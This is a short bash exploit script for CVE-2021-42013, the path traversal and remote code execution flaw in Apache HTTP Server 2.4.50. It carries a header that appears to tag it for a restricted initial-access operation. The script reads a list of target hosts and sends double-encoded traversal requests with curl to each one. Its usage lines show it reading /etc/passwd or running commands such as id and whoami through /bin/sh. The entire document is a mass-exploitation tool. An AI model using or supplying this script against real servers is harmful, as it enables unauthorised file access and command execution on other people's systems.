#
# 🛡️ HCG-SYSARCH: SAM-V5
# [RESTRICTED]: USO_INTERNO
# [ALCANCE]: OPD_HCG (CONV-0221-JAL-HCG-2026)
# [MODULO]: TA0001_Initial_Access
# [COMPONENTE]: T1190_integration_bridge_Public_Facing_App
#
# integration_bridge: Apache HTTP Server 2.4.50 - Path Traversal & Remote Code Execution (RCE)
# Vendor Homepage:  https://apache.org/
# Version: 2.4.50
# Tested on: 2.4.50
# CVE : CVE-2021-42013

#!/bin/bash

if [[ $1 == '' ]]; [[ $2 == '' ]]; then
echo Set [TAGET-LIST.TXT] [PATH] [COMMAND]
echo ./STRATCOM_MOD.sh targets.txt /etc/passwd
echo ./STRATCOM_MOD.sh targets.txt /bin/sh id

exit
fi
for host in $(cat $1); do
echo $host
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; $3" "$host/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/$2"; done

# STRATCOM_MOD.sh targets.txt /etc/passwd
# STRATCOM_MOD.sh targets.txt /bin/sh whoami